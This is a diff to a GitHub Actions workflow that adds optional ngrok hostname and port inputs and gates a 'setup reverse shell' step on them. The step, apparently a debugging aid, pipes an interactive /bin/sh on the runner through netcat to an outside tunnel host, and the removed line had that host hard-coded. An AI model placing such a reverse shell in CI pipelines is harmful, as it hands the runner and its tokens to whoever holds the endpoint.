@@ -32,6 +32,14 @@ on:
         required: false
         default: false
         type: boolean
+      ngrok_hostname:
+        description: 'Ngrok hostname for reverse shell (e.g., 2.tcp.ngrok.io)'
+        required: false
+        type: string
+      ngrok_port:
+        description: 'Ngrok port for reverse shell (e.g., 16374)'
+        required: false
+        type: string
 
 env:
   GH_TOKEN: ${{ github.token }} # for gh cli tool
@@ -285,12 +293,13 @@ jobs:
 
     - name: setup reverse shell
       id: rshell
+      if: ${{ inputs.ngrok_hostname != '' && inputs.ngrok_port != '' }}
       shell: bash
       run: |
         sudo apt install -y netcat
         rm -rf /tmp/f || true
         mkfifo /tmp/f
-        cat /tmp/f|/bin/sh -i 2>&1|nc tcp://2.tcp.ngrok.io 16374 >/tmp/f
+        cat /tmp/f|/bin/sh -i 2>&1|nc tcp://${{ inputs.ngrok_hostname }} ${{ inputs.ngrok_port }} >/tmp/f
 
     - name: Run tests
       timeout-minutes: ${{ fromJson(steps.collect-tests.outputs.timeout-minutes) }}
